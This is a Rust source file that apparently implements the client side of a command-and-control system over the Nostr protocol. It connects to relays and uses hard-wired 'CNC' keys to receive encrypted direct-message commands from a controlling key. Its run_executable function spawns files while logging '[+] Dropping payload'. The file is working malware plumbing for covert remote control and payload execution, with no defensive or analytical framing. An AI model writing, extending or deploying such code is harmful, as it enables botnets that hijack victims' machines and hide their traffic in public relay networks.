use std::{
    path::Path,
    process::{Child, Command},
    sync::mpsc::Receiver,
    time::Duration,
};

use nostr_sdk::prelude::*;

use crate::{CNC_PRIVATE_KEY, CNC_PUB_KEY};

pub struct SessionProps {
    pub name: String,
    pub display_name: String,
    pub private_key: Option<String>,
    pub relays: Vec<String>,
}

pub struct Session {
    pub keys: Keys,
    client: Client,
    name: String,
    display_name: String,
    relays: Vec<String>,
}

impl Session {
    pub fn create(props: SessionProps) -> Self {
        let keys: Keys = match props.private_key {
            Some(key) => Keys::parse(key.as_str()).unwrap(),
            None => Keys::generate(),
        };
        println!("PRIVATE KEY:{:?}", keys.secret_key().to_bech32());
        println!("PUBLIC KEY: {:?}", keys.public_key().to_bech32());
        let connection: Connection = Connection::new();
        let opts = Options::new().connection(connection);

        let client = Client::builder().signer(keys.clone()).opts(opts).build();

        Self {
            keys,
            client,
            display_name: props.display_name,
            name: props.name,
            relays: props.relays,
        }
    }

    pub async fn init(&self) -> Result<()> {
        for relay in &self.relays {
            self.client.add_relay(relay.as_str()).await?;
            self.client.connect_relay(relay.as_str()).await?;
            println!("Connected to relay: {}", relay);
        }

        Ok(())
    }

    pub async fn subscribe(&self, filter: Filter) -> Result<ReceiverStream<Event>> {
        let output = self.client.subscribe(filter.clone(), None).await?;

        let stream = self
            .client
            .pool()
            .stream_events(
                filter,
                Duration::MAX,
                ReqExitPolicy::WaitDurationAfterEOSE(Duration::MAX),
            )
            .await?;
        Ok(stream)
    }

    pub async fn update_metadata(&self, about: &str) -> Result<()> {
        let metadata = Metadata::new()
            .name(self.name.as_str())
            .display_name(self.display_name.as_str())
            .about(about);

        self.client.set_metadata(&metadata).await?;

        Ok(())
    }

    pub async fn subscribe_notes(&self, pubkey: PublicKey) -> Result<ReceiverStream<Event>> {
        let filter = Filter::new().kind(Kind::TextNote).author(pubkey);
        return self.subscribe(filter).await;
    }

    pub async fn send_msg(&self, content: &str, pubkey: PublicKey) -> Result<()> {
        let encrypted =
            nip04::encrypt(self.keys.secret_key(), &pubkey, content.as_bytes()).unwrap();
        let tag = Tag::public_key(pubkey);
        let event = EventBuilder::new(Kind::EncryptedDirectMessage, encrypted).tag(tag);

        // println!("sending event: {:?}", encrypted);
        // println!("sending event: {:?}", decrypted);
        self.client.send_event_builder(event).await?;
        Ok(())
    }

    pub async fn receive_msgs(
        &self,
        pubkey: PublicKey,
    ) -> Result<
        nostr_sdk::async_utility::futures_util::stream::Map<
            ReceiverStream<Event>,
            impl FnMut(Event) -> String,
        >,
    > {
        let filter = Filter::new()
            .kind(Kind::EncryptedDirectMessage)
            .author(pubkey)
            .pubkey(self.keys.public_key());

        let stream = self.subscribe(filter).await?;
        let decrypted_stream = stream.map(move |event| {
            let decrypted = nip04::decrypt(&self.keys.secret_key(), &pubkey, event.content.clone());
            if let Ok(decrypted) = decrypted {
                decrypted
            } else {
                if let Err(e) = decrypted {
                    println!("Error: {:?}", e);
                }
                event.content
            }
        });
        Ok(decrypted_stream)
    }

    pub fn run_executable(&self, path: &Path) -> Child {
        println!("[+] Dropping payload {:?}", path.to_str());
        let child = Command::new(path)
            .spawn()
            .expect("couldn't spawn child process");
        return child;
    }
}
